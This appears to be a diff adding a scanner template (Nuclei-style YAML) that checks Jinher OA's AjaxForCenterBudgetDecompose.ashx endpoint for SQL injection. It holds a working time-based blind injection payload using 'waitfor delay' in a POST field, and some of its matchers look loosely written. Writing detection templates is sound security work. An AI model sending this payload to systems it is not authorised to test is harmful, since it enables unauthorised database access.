@@ -1,0 +1,36 @@
+id: jinher-jhsoft-ajaxforcenterbudgetdecompose-sqli
+info:
+  name: 金和OA AjaxForCenterBudgetDecompose.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    金和OA AjaxForCenterBudgetDecompose.ashx endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: POST
+    path:
+      - "/c6/JHSoft.Web.CostControl/Decompose/AjaxForCenterBudgetDecompose.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "strType=getBudgetTime&strDeptId=1&strYear=2012&type=1'waitfor+delay%270:0:{{t1}}%27--&TimeType=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
